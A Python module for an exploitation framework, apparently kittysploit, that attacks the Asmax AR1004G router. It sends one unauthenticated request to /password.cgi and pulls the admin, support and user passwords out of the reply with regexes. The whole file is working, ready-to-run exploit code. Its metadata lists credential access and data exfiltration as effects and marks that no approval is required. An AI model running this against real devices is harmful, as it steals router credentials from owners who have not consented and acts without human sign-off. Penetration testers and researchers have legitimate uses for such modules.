#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Asmax AR1004G Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Asmax AR1004G Password Disclosure',
        'description': 'Exploits Asmax AR1004G Password Disclosure vulnerability that allows to fetch credentials for: Admin, Support and User accounts.',
        'author': ['Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://github.com/lucyoa/exploits/blob/master/asmax/asmax.txt'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        creds = []

        print_status("Requesting {}".format(self.get_target_url()))
        response = self.http_request(
            method="GET",
            path="/password.cgi",
        )
        if response is None:
            print_error("Exploit failed - empty response")
            return

        tokens = [
            ("admin", r"pwdAdmin = '(.+?)'"),
            ("support", r"pwdSupport = '(.+?)'"),
            ("user", r"pwdUser = '(.+?)'")
        ]

        print_status("Trying to extract credentials")
        for token in tokens:
            res = re.findall(token[1], response.text)
            if res:
                creds.append((token[0], res[0]))

        if creds:
            print_success("Credentials found")
            print_table(("Login", "Password"), *creds)
        else:
            print_error("Exploit failed - credentials could not be found")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/password.cgi"
        )

        if response is None:
            return False  # target is not vulnerable

        if any(map(lambda x: x in response.text, ["pwdSupport", "pwdUser", "pwdAdmin"])):
            return True  # target vulnerable

        return False  # target not vulnerable
